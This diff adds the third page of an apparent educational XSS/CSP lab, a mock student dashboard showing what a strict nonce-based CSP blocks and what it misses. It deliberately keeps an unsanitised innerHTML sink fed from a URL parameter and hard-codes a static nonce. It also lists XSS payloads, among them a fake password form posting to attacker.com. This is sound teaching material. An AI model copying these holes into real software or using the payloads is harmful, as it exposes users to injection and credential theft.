@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Version 3 — Strict Nonce-Based CSP</title>
+
+  <!-- ══════════════════════════════════════════════════
+       VERSION 3: STRICT NONCE-BASED CSP
+
+       POLICY ACTIVE:
+       Content-Security-Policy:
+         default-src 'self';
+         script-src 'self' 'nonce-xSec2024ProjectNonce';
+
+       HOW NONCE WORKS:
+       - Server generates a random nonce per request
+       - Nonce is added to CSP header AND to each <script> tag
+       - Browser ONLY executes scripts with the matching nonce
+       - Injected scripts (via innerHTML) have NO nonce → BLOCKED
+
+       WHAT THIS STOPS:
+       ✓ <script>alert()</script> — blocked (no nonce)
+       ✓ <svg onload=alert()>    — blocked (event handlers)
+       ✓ <img onerror=...>       — blocked (event handlers)
+
+       WHAT THIS DOES NOT STOP:
+       ✗ HTML injection          — innerHTML still modifies DOM
+       ✗ Defacement / fake UI    — visual content still injected
+       ✗ The root vulnerability  — innerHTML still unsanitized
+  ══════════════════════════════════════════════════ -->
+
+  <meta http-equiv="Content-Security-Policy"
+        content="default-src 'self';
+                 script-src 'self' 'nonce-xSec2024ProjectNonce';
+                 style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+                 font-src https://fonts.gstatic.com;
+                 img-src 'self' data:;
+                 connect-src 'self';">
+
+  <link rel="stylesheet" href="shared.css">
+  <style>
+    .vuln-section { border: 1px solid rgba(124,106,247,0.35); }
+    .vuln-header { background: rgba(124,106,247,0.07); border-bottom: 1px solid rgba(124,106,247,0.2); }
+    .vuln-header h3 { color: var(--accent3); }
+    .render-zone { border-color: rgba(124,106,247,0.4); }
+    .render-zone-label { color: var(--accent3); }
+    .url-field input:focus { border-color: var(--accent3); }
+    .inject-btn { background: var(--accent3); }
+    .inject-btn:hover { background: #6a58e8; }
+    .payload-item:hover { border-color: var(--accent3); }
+    .payload-item .pi-tag { color: var(--accent3); }
+  </style>
+</head>
+<body>
+
+<div class="exp-banner banner-v3">
+  <div class="eb-left">
+    <span class="eb-tag">Version 3 / 4</span>
+    <span class="eb-title">🛡 Strict Nonce-Based CSP</span>
+    <span class="eb-desc">Script execution blocked — but HTML injection & root vulnerability remain</span>
+  </div>
+  <a href="index.html" style="color:var(--accent3)">← Back to Hub</a>
+</div>
+
+<nav class="sidebar">
+  <div class="sidebar-brand">
+    <div class="icon">🎓</div>
+    <div class="name">Academia<span>Secure</span></div>
+  </div>
+  <div class="nav-section">Navigation</div>
+  <a class="nav-item active" href="#"><span class="ni">🏠</span> Dashboard</a>
+  <a class="nav-item" href="#vuln"><span class="ni">💉</span> XSS Demo</a>
+  <a class="nav-item" href="#csp-panel"><span class="ni">🛡</span> CSP Config</a>
+
+  <div class="version-links">
+    <div class="vl-title">Experiment Versions</div>
+    <a class="vl-item" href="dashboard-v1-no-csp.html"><div class="vl-dot" style="background:var(--accent2)"></div> V1 — No CSP</a>
+    <a class="vl-item" href="dashboard-v2-weak-csp.html"><div class="vl-dot" style="background:var(--warn)"></div> V2 — Weak CSP</a>
+    <a class="vl-item current" href="dashboard-v3-strict-csp.html"><div class="vl-dot" style="background:var(--accent3)"></div> V3 — Strict CSP</a>
+    <a class="vl-item" href="dashboard-v4-secure.html"><div class="vl-dot" style="background:var(--accent)"></div> V4 — Secure Code</a>
+  </div>
+</nav>
+
+<div class="main">
+  <div class="topbar">
+    <div class="topbar-left">
+      <div class="page-title">Student Dashboard</div>
+      <div class="breadcrumb">experiment / v3 / strict-nonce-csp</div>
+    </div>
+    <div class="topbar-right">
+      <div class="user-pill">
+        <div class="avatar" id="avatarLetter">S</div>
+        <span class="uname" id="displayUser">student</span>
+      </div>
+      <button class="logout-btn" onclick="logout()">Logout →</button>
+    </div>
+  </div>
+
+  <div class="content">
+
+    <div class="stats-row">
+      <div class="stat-card">
+        <div class="label">GPA</div>
+        <div class="value" style="color:var(--accent)">3.85</div>
+        <div class="sub">↑ This semester</div>
+        <div class="corner">📈</div>
+      </div>
+      <div class="stat-card">
+        <div class="label">Courses</div>
+        <div class="value">6</div>
+        <div class="sub">Enrolled this term</div>
+        <div class="corner">📚</div>
+      </div>
+      <div class="stat-card">
+        <div class="label">CSP Status</div>
+        <div class="value" style="font-size:13px;color:var(--accent3);font-family:var(--mono);margin-top:6px">STRICT</div>
+        <div class="sub" style="color:var(--accent3)">Nonce-based policy</div>
+        <div class="corner">🛡</div>
+      </div>
+      <div class="stat-card">
+        <div class="label">Script XSS Risk</div>
+        <div class="value" style="font-size:13px;color:var(--accent);font-family:var(--mono);margin-top:6px">MITIGATED</div>
+        <div class="sub" style="color:var(--warn)">HTML injection: still possible</div>
+        <div class="corner">⚡</div>
+      </div>
+    </div>
+
+    <div class="main-grid">
+      <div class="panel">
+        <div class="panel-header"><h3>📊 Grades</h3><span class="ph-badge badge-ok">Protected</span></div>
+        <div class="panel-body">
+          <table>
+            <thead><tr><th>Course</th><th>Code</th><th>Grade</th></tr></thead>
+            <tbody>
+              <tr><td>Web Security</td><td style="font-family:var(--mono);font-size:12px;color:var(--muted)">CS-481</td><td><span class="grade-pill gA">A</span></td></tr>
+              <tr><td>Cryptography</td><td style="font-family:var(--mono);font-size:12px;color:var(--muted)">CS-460</td><td><span class="grade-pill gA">A-</span></td></tr>
+              <tr><td>Network Security</td><td style="font-family:var(--mono);font-size:12px;color:var(--muted)">CS-450</td><td><span class="grade-pill gB">B+</span></td></tr>
+              <tr><td>Software Eng.</td><td style="font-family:var(--mono);font-size:12px;color:var(--muted)">CS-390</td><td><span class="grade-pill gA">A</span></td></tr>
+              <tr><td>OS</td><td style="font-family:var(--mono);font-size:12px;color:var(--muted)">CS-340</td><td><span class="grade-pill gB">B</span></td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+      <div class="panel">
+        <div class="panel-header"><h3>🔑 Session Token</h3><span class="ph-badge badge-info">Harder to Steal</span></div>
+        <div class="panel-body">
+          <div class="token-box" style="background:rgba(124,106,247,0.06);border-color:rgba(124,106,247,0.2)">
+            <div class="tb-label" style="color:var(--accent3)">auth_token — JS theft now blocked by CSP</div>
+            <div class="token-display" id="tokenDisplay">Loading...</div>
+          </div>
+          <p style="font-family:var(--mono);font-size:11px;color:var(--muted);margin-top:12px;line-height:1.7">
+            Injected event handlers are blocked. Direct JS token theft via XSS is now prevented by the nonce policy.
+            <span style="color:var(--warn)">However, if tokens were in HttpOnly cookies instead of localStorage, protection would be complete.</span>
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <!-- CSP Policy Panel -->
+    <div class="panel full-width" id="csp-panel" style="margin-bottom:20px">
+      <div class="panel-header"><h3>🛡 Active CSP — Version 3</h3><span class="ph-badge badge-info">Nonce-Based</span></div>
+      <div class="panel-body">
+        <div class="code-snippet">
+          <div class="cs-header"><span class="lang">HTTP Meta Tag — Active Policy</span><span>This page</span></div>
+          <pre><span class="hi-green">&lt;meta http-equiv=<span class="str">"Content-Security-Policy"</span>
+      content=<span class="str">"default-src 'self';
+               script-src 'self' '<span class="hi-green">nonce-xSec2024ProjectNonce</span>';
+               img-src 'self' data:;
+               connect-src 'self';"</span>&gt;</span>
+
+<span class="cm">// The legitimate script tag has the nonce:</span>
+<span class="hi-green">&lt;script nonce=<span class="str">"xSec2024ProjectNonce"</span>&gt;</span> <span class="cm">← executes normally</span>
+  ... application code ...
+<span class="hi-green">&lt;/script&gt;</span>
+
+<span class="cm">// Injected payload has NO nonce:</span>
+<span class="hi-red">&lt;img src=x onerror=stealToken()&gt;</span>
+<span class="cm">// Browser: "Refused to execute inline event handler because
+//  it violates the following CSP directive: script-src 'nonce-...'"</span></pre>
+        </div>
+      </div>
+    </div>
+
+    <!-- Vuln Demo -->
+    <div class="vuln-section" id="vuln">
+      <div class="vuln-header">
+        <span style="font-size:20px">🛡</span>
+        <div>
+          <h3>DOM-XSS — Script Execution BLOCKED · HTML Injection Still Works</h3>
+          <p>CSP nonce blocks event handlers · But innerHTML still accepts HTML · Root cause unresolved</p>
+        </div>
+        <span class="ph-badge badge-info" style="margin-left:auto">PARTIAL MITIGATION</span>
+      </div>
+      <div class="vuln-body">
+
+        <div class="result-box" style="background:rgba(124,106,247,0.06);border-color:rgba(124,106,247,0.3);color:var(--accent3)">
+          <div class="rb-title">🛡 Expected Behavior — Version 3</div>
+          <span style="color:var(--muted)">
+            Payloads with <code style="color:var(--warn)">onerror</code> / <code style="color:var(--warn)">onload</code> will be <b style="color:var(--accent)">BLOCKED</b> by CSP — check DevTools Console for violation errors.<br><br>
+            However, <b style="color:var(--accent2)">plain HTML injection still works</b> — you can still inject visible content, fake UI elements, and defacement into the page. The innerHTML vulnerability is not fixed.
+          </span>
+        </div>
+
+        <div class="url-label" style="margin-top:16px">Test payloads against nonce-based CSP:</div>
+        <div class="url-field">
+          <input type="text" id="reportInput" placeholder="Try: <b>HTML Works</b>  or  <img src=x onerror=alert('blocked?')>"/>
+          <button class="inject-btn" onclick="simulateInject()">Inject →</button>
+        </div>
+
+        <div class="url-label">📍 innerHTML Render Zone — scripts blocked, HTML renders:</div>
+        <div class="render-zone" id="renderZone">
+          <span class="render-zone-label">innerHTML — nonce CSP active</span>
+          <span style="color:var(--muted);font-family:var(--mono);font-size:12px">Awaiting payload...</span>
+        </div>
+
+        <div class="payload-grid">
+          <div class="payload-item" onclick="loadPayload('<img src=x onerror=alert(\'This should be BLOCKED by nonce CSP\')>')">
+            <div class="pi-tag">1. onerror → Should be BLOCKED ✓</div>
+            <div class="pi-code">&lt;img src=x onerror=alert('blocked')&gt;</div>
+          </div>
+          <div class="payload-item" onclick="loadPayload('<svg onload=alert(\'SVG onload — also BLOCKED\')></svg>')">
+            <div class="pi-tag">2. SVG onload → Should be BLOCKED ✓</div>
+            <div class="pi-code">&lt;svg onload=alert('blocked')&gt;&lt;/svg&gt;</div>
+          </div>
+          <div class="payload-item" onclick="loadPayload('<div style=\'background:rgba(255,0,0,0.15);padding:20px;border:2px solid red;border-radius:8px\'><h2 style=\'color:red\'>⚠ PAGE DEFACED</h2><p>HTML injection works even with strict CSP. Visual damage is still possible.</p></div>')">
+            <div class="pi-tag">3. HTML Injection → Still WORKS ✗</div>
+            <div class="pi-code">&lt;div style='...'&gt;DEFACED&lt;/div&gt;</div>
+          </div>
+          <div class="payload-item" onclick="loadPayload('<form action=\'https://attacker.com/phish\' style=\'background:#1a0a0c;padding:20px;border-radius:8px\'><p style=\'color:#ff4d6d;font-family:monospace\'>Session expired. Re-enter password:</p><input type=password placeholder=Password style=\'width:100%;padding:8px;background:#0a0a10;border:1px solid #333;color:white;border-radius:4px\'><br><br><button style=\'background:#ff4d6d;color:white;border:none;padding:8px 16px;border-radius:4px;cursor:pointer\'>Submit</button></form>')">
+            <div class="pi-tag">4. Fake Login Form → Still WORKS ✗</div>
+            <div class="pi-code">&lt;form action='attacker.com'&gt;...&lt;/form&gt;</div>
+          </div>
+        </div>
+
+        <div class="result-box" style="background:rgba(255,184,48,0.05);border-color:rgba(255,184,48,0.25);color:var(--warn);margin-top:16px">
+          <div class="rb-title">⚠ Key Academic Insight</div>
+          <span style="color:var(--muted)">
+            Strict CSP successfully prevents <b style="color:var(--accent)">JavaScript execution</b> from injected payloads — this is a real improvement over V1 and V2.<br><br>
+            But it does NOT prevent <b style="color:var(--accent2)">HTML injection</b>. An attacker can still: (1) deface the page, (2) inject fake login forms to capture credentials, (3) inject misleading content.<br><br>
+            <b style="color:var(--warn)">Conclusion: CSP is a mitigation, not a fix. The innerHTML vulnerability must be resolved at the code level.</b>
+          </span>
+        </div>
+
+        <div class="code-snippet">
+          <div class="cs-header"><span class="lang">How the nonce protects the legitimate script</span></div>
+          <pre><span class="cm">// ✓ This executes — has the correct nonce</span>
+<span class="hi-green">&lt;script nonce=<span class="str">"xSec2024ProjectNonce"</span>&gt;</span>
+  ... all application logic here ...
+<span class="hi-green">&lt;/script&gt;</span>
+
+<span class="cm">// ✗ Injected payload — no nonce → BLOCKED by browser</span>
+<span class="hi-red">&lt;img src=x onerror="stealToken()"&gt;</span>
+<span class="cm">// Console: Refused to execute inline event handler
+//          because it violates CSP script-src directive.</span>
+
+<span class="cm">// ✗ But HTML still renders (CSP does not block HTML):</span>
+<span class="hi-red">&lt;form action="https://attacker.com/phish"&gt;...&lt;/form&gt;</span>
+<span class="cm">// This renders visually. No CSP violation. User may be tricked.</span></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel full-width">
+      <div class="panel-header"><h3>📋 Console Log</h3><span class="ph-badge badge-info">CSP Violations Will Appear Here</span></div>
+      <div class="panel-body">
+        <div class="console-box">
+          <div class="cb-title">Simulated Console — for real violations open DevTools (F12) → Console</div>
+          <div id="logContainer"></div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ✓ Legitimate script WITH nonce — executes normally -->
+<script nonce="xSec2024ProjectNonce">
+  const token = localStorage.getItem('auth_token');
+  if (!token) window.location.href = 'login.html';
+  const authUser = localStorage.getItem('auth_user') || 'student';
+  document.getElementById('displayUser').textContent = authUser;
+  document.getElementById('avatarLetter').textContent = authUser.charAt(0).toUpperCase();
+  document.getElementById('tokenDisplay').innerHTML =
+    '<b style="color:var(--accent3)">' + token.substring(0,35) + '...</b><br><span style="opacity:0.5">' + token.substring(35,70) + '...</span>';
+
+  const logs = [];
+  function addLog(msg, type='info') {
+    logs.unshift({ ts: new Date().toLocaleTimeString(), msg, type });
+    document.getElementById('logContainer').innerHTML = logs.map(l =>
+      `<div class="log-line"><span class="ll-ts">${l.ts}</span><span class="ll-${l.type}">${l.msg}</span></div>`
+    ).join('');
+  }
+
+  addLog("CSP ACTIVE: script-src 'self' 'nonce-xSec2024ProjectNonce'", 'ok');
+  addLog('Legitimate script executed (has correct nonce)', 'ok');
+  addLog('Injected event handlers will be blocked — check DevTools for violations', 'info');
+  addLog('⚠ HTML injection via innerHTML still possible — root cause not fixed', 'warn');
+
+  const urlReport = new URLSearchParams(window.location.search).get('report');
+  if (urlReport) {
+    // ⚠ innerHTML still VULNERABLE to HTML injection — CSP only blocks script execution
+    document.getElementById('renderZone').innerHTML = urlReport;
+    document.getElementById('reportInput').value = urlReport;
+    addLog('URL ?report= injected — HTML renders, scripts blocked by CSP', 'warn');
+  }
+
+  function simulateInject() {
+    const payload = document.getElementById('reportInput').value;
+    if (!payload) return;
+    document.getElementById('renderZone').innerHTML = payload;
+    history.pushState({}, '', '?report=' + encodeURIComponent(payload));
+    addLog('Payload injected via innerHTML — CSP blocks JS, HTML renders: ' + payload.substring(0,50), 'warn');
+    if (payload.toLowerCase().includes('onerror') || payload.toLowerCase().includes('onload') || payload.toLowerCase().includes('script')) {
+      setTimeout(() => addLog('⛔ CSP VIOLATION: "Refused to execute inline event handler" — see DevTools', 'err'), 300);
+    }
+  }
+
+  function loadPayload(p) {
+    document.getElementById('reportInput').value = p;
+    addLog('Payload loaded: ' + p.substring(0,50), 'info');
+  }
+
+  function logout() { localStorage.clear(); window.location.href = 'login.html'; }
+</script>
+</body>
+</html>
